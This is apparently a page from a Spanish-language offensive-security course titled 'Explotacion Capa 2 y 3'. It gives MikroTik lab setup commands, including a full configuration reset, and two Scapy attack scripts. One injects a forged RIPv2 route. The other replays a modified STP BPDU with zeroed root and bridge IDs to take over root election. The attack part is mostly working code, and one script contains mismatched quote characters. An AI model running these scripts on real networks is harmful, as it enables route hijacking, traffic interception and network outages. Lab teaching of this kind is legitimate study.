---
theme: "just-the-docs"
title: "Explotacion Capa 2 y 3"
layout: default
nav_order: 19
parent: "Seguridad Ofensiva"
---
# Explotacion Capa 2 y 3
## Configuracion Mikrotik
Opcionalmente si quieres borrar el mikrotik se puede usar el siguiente comando:
```
system reset-configuration
```
Para revisar las IPs en Mikrotik
```
ip add print
```
Configuracion de interface bridge, asignacion de IP y configuracion de RIP
```
interface bridge add name=bridge1
interface bridge port add bridge=bridge1 interface=ether1
ip dhcp-client add disabled=no interface=bridge1
routing rip interface add send=v1-2
routing rip network add network=192.168.85.0/24
```
Revision de la tabla de rutas
```
ip route print
```
## Creacion de script para inyeccion de rutas con RIP
```
nano rip.py
```
```
from scapy.all import *
PDU = Ether(dst="01:00:5e:00:00:09", src="aa:bb:cc:00:11:22", type="IPv4")
PDU /= IP(tos=192,ttl=2,proto=17,src="192.168.85.100",dst="224.0.0.9")
PDU /= UDP(sport=520, dport=520)
PDU /= RIP(cmd=2,version=2)
PDU /= RIPEntry(AF=2, RouteTag=1354, addr="2.0.0.0", mask="255.0.0.0", nextHop="0.0.0.0", metric=1)
sendp(PDU)
```
## Creacion de script para la manipulacion de STP
```
nano stp.py
```
```
from scapy.all import *
PDU = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
PDU[0].src="00:00:00:00:00:00”
PDU[0].rootid=0
PDU[0].rootmac="00:00:00:00:00:00”
PDU[0].bridgeid=0
PDU[0].bridgemac="00:00:00:00:00:00”
for i in range (0, 50):
    sendp(PDU[0])
    time.sleep(2)
```

